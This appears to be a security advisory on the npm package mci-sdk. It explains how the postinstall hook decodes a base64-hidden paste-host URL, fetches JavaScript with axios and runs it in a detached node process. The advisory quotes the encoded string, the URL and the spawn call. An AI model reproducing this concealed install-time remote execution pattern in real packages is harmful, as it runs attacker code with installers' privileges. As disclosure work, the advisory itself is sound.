summary: mci-sdk postinstall fetches remote JavaScript from anonymous paste host and executes it via detached node process
details: On `npm install`, mci-sdk runs the postinstall hook `node./src/exec.js`, which imports `./core/index.js` and invokes `multiChainInterface` at module top level. The function ignores its argument and reads a base64-encoded string from `MULTI_CHAIN_CONFIG.{dev,prod}.apiKey` in `src/core/config.js` (`aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iLzJQNUZB`), decodes it to `https://jsonkeeper.com/b/2P5FA` (an anonymous, mutable JSON paste host), fetches that URL with `axios.get(atob(apiKey))`, then spawns a detached `node` process with `spawn('node', [], {detached:true, stdio:['pipe','ignore','ignore']})`, pipes `response.data.cookie` into its stdin, and calls `child.unref()` so the child survives the install. The piped content is attacker-controlled JavaScript executed with the installer's privileges. The misnamed `apiKey` field, base64 obfuscation of the destination URL, anonymous paste hosting, and detached/unref'd execution together constitute deliberate concealment of an install-time remote code execution channel.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
